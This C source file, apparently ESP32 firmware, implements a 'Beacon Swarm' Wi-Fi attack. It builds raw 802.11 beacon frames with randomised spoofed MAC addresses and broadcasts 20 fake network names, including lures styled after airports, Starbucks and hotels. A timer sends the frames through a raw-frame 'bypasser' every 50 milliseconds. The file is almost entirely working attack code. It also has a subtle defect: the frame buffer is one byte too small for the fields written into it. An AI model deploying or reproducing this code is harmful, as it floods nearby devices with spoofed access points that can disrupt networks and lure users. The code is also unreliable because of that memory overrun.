/**
 * @file attack_beacon.c
 * @brief Implements SSID Beacon Swarm attack
 * 
 * Broadcasts multiple fake beacon frames to flood nearby WiFi scanners
 * with fake access point names.
 */
#include "attack_beacon.h"

#include <string.h>
#include <stdlib.h>

#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_err.h"
#include "esp_timer.h"
#include "esp_system.h"

#include "attack.h"
#include "wsl_bypasser.h"

static const char *TAG = "main:attack_beacon";

// Beacon frame template (minimal valid beacon)
static uint8_t beacon_frame_template[] = {
    // Frame Control
    0x80, 0x00,                         // Type: Beacon
    // Duration
    0x00, 0x00,
    // Destination (broadcast)
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    // Source (will be randomized)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    // BSSID (same as source)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    // Sequence control
    0x00, 0x00,
    // Timestamp (8 bytes)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    // Beacon interval
    0x64, 0x00,
    // Capability info (ESS, Privacy)
    0x11, 0x04,
    // SSID Parameter Set (Tag: 0, Length: placeholder)
    0x00, 0x00  // SSID tag + length (will be set dynamically)
    // SSID data follows here...
    // Supported rates, DS Parameter Set, etc. follow
};

// Fake SSIDs for the beacon swarm
static const char *fake_ssids[] = {
    "FREE_WIFI_5G",
    "Airport_Free_WiFi",
    "Starbucks_Guest",
    "Hotel_Lobby",
    "McDonalds_Free",
    "FBI_Surveillance_Van",
    "Pretty_Fly_For_A_WiFi",
    "Drop_It_Like_Its_Hotspot",
    "The_Promised_LAN",
    "Wu_Tang_LAN",
    "Benjamin_FrankLAN",
    "Abraham_Linksys",
    "Router_I_Hardly_Know_Her",
    "Loading...",
    "Searching...",
    "Click_Here_Free_Virus",
    "Not_Your_WiFi",
    "Get_Off_My_LAN",
    "No_More_Mr_WiFi",
    "LAN_of_the_Free"
};

#define NUM_FAKE_SSIDS (sizeof(fake_ssids) / sizeof(fake_ssids[0]))

static esp_timer_handle_t beacon_timer_handle = NULL;
static bool beacon_running = false;
static uint8_t current_ssid_index = 0;

/**
 * @brief Generates a random MAC address for a beacon
 */
static void generate_random_mac(uint8_t *mac) {
    for (int i = 0; i < 6; i++) {
        mac[i] = esp_random() & 0xFF;
    }
    // Set locally administered bit, clear multicast bit
    mac[0] = (mac[0] & 0xFE) | 0x02;
}

/**
 * @brief Sends a single beacon frame with the given SSID
 */
static void send_beacon_frame(const char *ssid) {
    uint8_t ssid_len = strlen(ssid);
    if (ssid_len > 32) ssid_len = 32;
    
    // Frame size = template + SSID + supported rates + DS param
    uint8_t frame_size = sizeof(beacon_frame_template) + ssid_len + 8;
    uint8_t *frame = malloc(frame_size);
    if (frame == NULL) {
        ESP_LOGE(TAG, "Failed to allocate beacon frame");
        return;
    }
    
    memcpy(frame, beacon_frame_template, sizeof(beacon_frame_template));
    
    // Generate random MAC for source and BSSID
    uint8_t random_mac[6];
    generate_random_mac(random_mac);
    memcpy(&frame[10], random_mac, 6);  // Source
    memcpy(&frame[16], random_mac, 6);  // BSSID
    
    // Set SSID length
    frame[37] = ssid_len;
    
    // Copy SSID
    memcpy(&frame[38], ssid, ssid_len);
    
    // Add supported rates (tag 1)
    uint8_t rates_offset = 38 + ssid_len;
    frame[rates_offset] = 0x01;     // Tag: Supported Rates
    frame[rates_offset + 1] = 0x04; // Length
    frame[rates_offset + 2] = 0x82; // 1 Mbps (basic)
    frame[rates_offset + 3] = 0x84; // 2 Mbps (basic)
    frame[rates_offset + 4] = 0x8b; // 5.5 Mbps (basic)
    frame[rates_offset + 5] = 0x96; // 11 Mbps (basic)
    
    // Add DS Parameter Set (tag 3) - Channel
    frame[rates_offset + 6] = 0x03; // Tag: DS Parameter Set
    frame[rates_offset + 7] = 0x01; // Length
    frame[rates_offset + 8] = 0x06; // Channel 6 (commonly used)
    
    wsl_bypasser_send_raw_frame(frame, frame_size);
    
    free(frame);
}

/**
 * @brief Timer callback to send beacons
 */
static void beacon_timer_callback(void *arg) {
    if (!beacon_running) return;
    
    // Send beacon for current SSID
    send_beacon_frame(fake_ssids[current_ssid_index]);
    
    // Cycle to next SSID
    current_ssid_index = (current_ssid_index + 1) % NUM_FAKE_SSIDS;
}

void attack_beacon_start(attack_config_t *attack_config) {
    ESP_LOGI(TAG, "Starting Beacon Swarm attack with %d SSIDs...", NUM_FAKE_SSIDS);
    
    beacon_running = true;
    current_ssid_index = 0;
    
    // Create and start timer (send beacon every 50ms = 20 beacons/sec per SSID cycle)
    const esp_timer_create_args_t timer_args = {
        .callback = &beacon_timer_callback,
        .name = "beacon_swarm"
    };
    
    ESP_ERROR_CHECK(esp_timer_create(&timer_args, &beacon_timer_handle));
    ESP_ERROR_CHECK(esp_timer_start_periodic(beacon_timer_handle, 50000)); // 50ms interval
    
    ESP_LOGI(TAG, "Beacon Swarm attack started successfully");
}

void attack_beacon_stop(void) {
    ESP_LOGI(TAG, "Stopping Beacon Swarm attack...");
    
    beacon_running = false;
    
    if (beacon_timer_handle != NULL) {
        esp_timer_stop(beacon_timer_handle);
        esp_timer_delete(beacon_timer_handle);
        beacon_timer_handle = NULL;
    }
    
    ESP_LOGI(TAG, "Beacon Swarm attack stopped");
}
